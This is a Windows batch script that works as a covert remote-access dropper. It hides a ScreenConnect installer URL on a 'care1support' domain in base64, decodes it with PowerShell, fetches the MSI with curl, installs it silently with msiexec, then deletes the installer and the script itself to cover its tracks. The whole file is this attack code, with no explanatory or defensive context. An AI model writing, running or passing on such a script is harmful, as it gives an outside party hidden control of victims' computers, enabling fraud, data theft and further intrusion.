@echo off
setlocal enabledelayedexpansion

REM ==============================
REM Configuration
REM ==============================
:: Encrypted ScreenConnect URL
set "ENC_URL=aHR0cHM6Ly9zZXJ2ZXIuY2FyZTFzdXBwb3J0LmNsb3VkL0Jpbi9TY3JlZW5Db25uZWN0LkNsaWVudFNldHVwLm1zaT9lPUFjY2VzcyZ5PUd1ZXN0JmM9JmM9JmM9dXNlckEmYz0mYz0mYz0mYz0mYz0="
set "DOWNLOAD_DIR=%TEMP%\MSIInstall"

REM Decode URL using PowerShell
for /f "delims=" %%i in ('powershell -command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%ENC_URL%'))"') do set "MSI_URL=%%i"

if not exist "%DOWNLOAD_DIR%" mkdir "%DOWNLOAD_DIR%"

REM ==============================
REM Download MSI (Auto-Naming)
REM ==============================
echo Downloading...
cd /d "%DOWNLOAD_DIR%"

:: -O (Uppercase O) tells curl to use the filename provided by the server
curl -L -O "%MSI_URL%" --fail

REM Find the .msi file that was just downloaded (whatever its name is)
for /f "delims=" %%a in ('dir /b /a-d *.msi') do set "MSI_FILE=%%a"

if "%MSI_FILE%"=="" (
    echo ERROR: No MSI found.
    exit /b 1
)

REM ==============================
REM Install & Self-Destruct
REM ==============================
echo Installing %MSI_FILE%...
msiexec /i "%MSI_FILE%" /qn /norestart /log "install.log"

:: Give the installer a moment to start before cleaning up
timeout /t 3 /nobreak >nul

echo Cleaning up...
del /f /q "%MSI_FILE%"
cd /d %TEMP%

REM This line deletes the .bat file itself
(goto) 2>nul & del "%~f0"
